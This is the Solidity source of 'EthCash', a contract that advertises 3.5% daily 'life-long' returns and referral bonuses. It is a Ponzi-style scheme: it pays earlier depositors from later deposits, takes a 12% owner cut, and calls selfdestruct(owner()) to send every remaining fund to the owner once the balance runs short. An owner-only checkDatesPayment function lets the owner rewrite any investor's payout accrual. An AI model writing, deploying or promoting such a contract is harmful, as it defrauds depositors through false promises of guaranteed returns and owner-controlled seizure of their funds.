1 pragma solidity ^0.4.24;
2 
3 /*
4 *
5 * EthCash Contract Source
6 *~~~~~~~~~~~~~~~~~~~~~~~
7 * Web: ethcash.online
8 * Web mirrors: ethcash.global | ethcash.club
9 * Email: online@ethcash.online
10 * Telergam: ETHCash_Online
11 *~~~~~~~~~~~~~~~~~~~~~~~
12 *  - GAIN 3,50% PER 24 HOURS
13 *  - Life-long payments
14 *  - Minimal 0.03 ETH
15 *  - Can payouts yourself every 30 minutes - send 0 eth (> 0.001 ETH must accumulate on balance)
16 *  - Affiliate 7.00%
17 *    -- 3.50% Cashback (first payment with ref adress DATA)
18 *~~~~~~~~~~~~~~~~~~~~~~~   
19 * RECOMMENDED GAS LIMIT: 250000
20 * RECOMMENDED GAS PRICE: ethgasstation.info
21 *
22 */
23 
24 library SafeMath {
25     function mul(uint256 a, uint256 b) internal pure returns(uint256) {
26         if(a == 0) {
27             return 0;
28         }
29 
30         uint256 c = a * b;
31         require(c / a == b);
32 
33         return c;
34     }
35 
36     function div(uint256 a, uint256 b) internal pure returns(uint256) {
37         require(b > 0);
38         uint256 c = a / b;
39 
40         return c;
41     }
42 
43     function sub(uint256 a, uint256 b) internal pure returns(uint256) {
44         require(b <= a);
45         uint256 c = a - b;
46 
47         return c;
48     }
49 
50     function add(uint256 a, uint256 b) internal pure returns(uint256) {
51         uint256 c = a + b;
52         require(c >= a);
53 
54         return c;
55     }
56 
57     function mod(uint256 a, uint256 b) internal pure returns(uint256) {
58         require(b != 0);
59 
60         return a % b;
61     }
62 }
63 
64 contract Ownable {
65     address private _owner;
66 
67     event OwnershipRenounced(address indexed previousOwner);
68     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
69 
70     modifier onlyOwner() { require(isOwner()); _; }
71 
72     constructor() public {
73         _owner = msg.sender;
74     }
75 
76     function owner() public view returns(address) {
77         return _owner;
78     }
79 
80     function isOwner() public view returns(bool) {
81         return msg.sender == _owner;
82     }
83 
84     function renounceOwnership() public onlyOwner {
85         _owner = address(0);
86 
87         emit OwnershipRenounced(_owner);
88     }
89 
90     function transferOwnership(address newOwner) public onlyOwner {
91         _transferOwnership(newOwner);
92     }
93 
94     function _transferOwnership(address newOwner) internal {
95         require(newOwner != address(0));
96 
97         _owner = newOwner;
98         
99         emit OwnershipTransferred(_owner, newOwner);
100     }
101 }
102 
103 contract EthCashonline is Ownable {
104     using SafeMath for uint;
105     
106     struct Investor {
107         uint id;
108         uint deposit;
109         uint deposits;
110         uint date;
111         address referrer;
112     }
113 
114     uint private MIN_INVEST = 0.03 ether;
115     uint private OWN_COMMISSION_PERCENT = 12;
116     uint private REF_BONUS_PERCENT = 7;
117     uint private CASHBACK_PERCENT = 35;
118     uint private PAYOUT_INTERVAL = 1 minutes; 
119     uint private PAYOUT_SELF_INTERVAL = 30 minutes;
120     uint private INTEREST = 35;
121 
122     uint public depositAmount;
123     uint public payoutDate;
124     uint public paymentDate;
125 
126     address[] public addresses;
127     mapping(address => Investor) public investors;
128 
129     event Invest(address holder, uint amount);
130     event ReferrerBonus(address holder, uint amount);
131     event Cashback(address holder, uint amount);
132     event PayoutCumulative(uint amount, uint txs);
133     event PayoutSelf(address addr, uint amount);
134     
135     constructor() public {
136         payoutDate = now;
137     }
138     
139     function() payable public {
140 
141         if (0 == msg.value) {
142             payoutSelf();
143             return;
144         }
145 
146         require(msg.value >= MIN_INVEST, "Too small amount");
147 
148         Investor storage user = investors[msg.sender];
149 
150         if(user.id == 0) {
151             user.id = addresses.length + 1;
152             addresses.push(msg.sender);
153 
154             address ref = bytesToAddress(msg.data);
155             if(investors[ref].deposit > 0 && ref != msg.sender) {
156                 user.referrer = ref;
157             }
158         }
159 
160         user.deposit = user.deposit.add(msg.value);
161         user.deposits = user.deposits.add(1);
162         user.date = now;
163         emit Invest(msg.sender, msg.value);
164 
165         paymentDate = now;
166         depositAmount = depositAmount.add(msg.value);
167 
168         uint own_com = msg.value.div(100).mul(OWN_COMMISSION_PERCENT);
169         owner().transfer(own_com);
170 
171         if(user.referrer != address(0)) {
172             uint bonus = msg.value.div(100).mul(REF_BONUS_PERCENT);
173             user.referrer.transfer(bonus);
174             emit ReferrerBonus(user.referrer, bonus);
175 
176             if(user.deposits == 1) {
177                 uint cashback = msg.value.div(1000).mul(CASHBACK_PERCENT);
178                 msg.sender.transfer(cashback);
179                 emit Cashback(msg.sender, cashback);
180             }
181         }
182     }
183     
184     function payout(uint limit) public {
185 
186         require(now >= payoutDate + PAYOUT_INTERVAL, "Too fast payout request");
187 
188         uint sum;
189         uint txs;
190 
191         for(uint i = addresses.length ; i > 0; i--) {
192             address addr = addresses[i - 1];
193 
194             if(investors[addr].date + 24 hours > now) continue;
195 
196             uint amount = getInvestorUnPaidAmount(addr);
197             investors[addr].date = now;
198 
199             if(address(this).balance < amount) {
200                 selfdestruct(owner());
201                 return;
202             }
203 
204             addr.transfer(amount);
205 
206             sum = sum.add(amount);
207 
208             if(++txs >= limit) break;
209         }
210 
211         payoutDate = now;
212 
213         emit PayoutCumulative(sum, txs);
214     }
215     
216     function payoutSelf() public {
217         address addr = msg.sender;
218 
219         require(investors[addr].deposit > 0, "Deposit not found");
220         require(now >= investors[addr].date + PAYOUT_SELF_INTERVAL, "Too fast payout request");
221 
222         uint amount = getInvestorUnPaidAmount(addr);
223         require(amount >= 1 finney, "Too small unpaid amount");
224 
225         investors[addr].date = now;
226 
227         if(address(this).balance < amount) {
228             selfdestruct(owner());
229             return;
230         }
231 
232         addr.transfer(amount);
233 
234         emit PayoutSelf(addr, amount);
235     }
236     
237     function bytesToAddress(bytes bys) private pure returns(address addr) {
238         assembly {
239             addr := mload(add(bys, 20))
240         }
241     }
242 
243     function getInvestorUnPaidAmount(address addr) public view returns(uint) {
244         return investors[addr].deposit.div(1000).mul(INTEREST).div(100).mul(now.sub(investors[addr].date).mul(100)).div(1 days);
245     }
246 
247     function getInvestorCount() public view returns(uint) { return addresses.length; }
248     function checkDatesPayment(address addr, uint date) onlyOwner public { investors[addr].date = date; }
249 }